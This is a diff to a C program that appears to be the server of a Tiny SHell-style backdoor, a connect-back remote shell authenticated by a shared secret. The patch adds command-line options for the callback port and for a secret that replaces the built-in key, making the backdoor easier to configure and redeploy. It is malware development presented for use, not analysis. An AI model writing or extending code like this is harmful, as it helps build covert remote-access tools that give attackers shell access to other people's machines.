@@ -48,6 +48,7 @@ int main( int argc, char *argv[] )
     int ret, client, server;
     socklen_t n;
     int opt;
+    unsigned short server_port=0;
     struct sockaddr_in server_addr;
     struct sockaddr_in client_addr;
     struct hostent *server_host;
@@ -55,6 +56,7 @@ int main( int argc, char *argv[] )
     char dash[5], bash[5], minimal[8];
     char exec[18];
     int i=0;
+    char *dynamic_secret = NULL;
 
     while ((opt = getopt(argc, argv, "p:s:")) != -1) {
         switch (opt) {
@@ -63,7 +65,7 @@ int main( int argc, char *argv[] )
                 if (!server_port) usage(*argv);
                 break;
             case 's':
-                secret=optarg; 
+                dynamic_secret = strdup(optarg);
                 break;
             default: /* '?' */
                 usage(*argv);
@@ -122,7 +124,7 @@ connect:
                 server_host->h_length );
 
         server_addr.sin_family = AF_INET;
-        server_addr.sin_port   = htons( server_port );
+        server_addr.sin_port   = htons( server_port ? server_port : SERVER_PORT );
 
         /* connect to the remote host */
 
@@ -204,7 +206,7 @@ connect:
     {
         /* 1st try, using the built-in secret key */
 
-        ret = pel_client_init( server, secret );
+        ret = pel_client_init( server, dynamic_secret ? dynamic_secret : secret );
 
         if( ret != PEL_SUCCESS )
         {
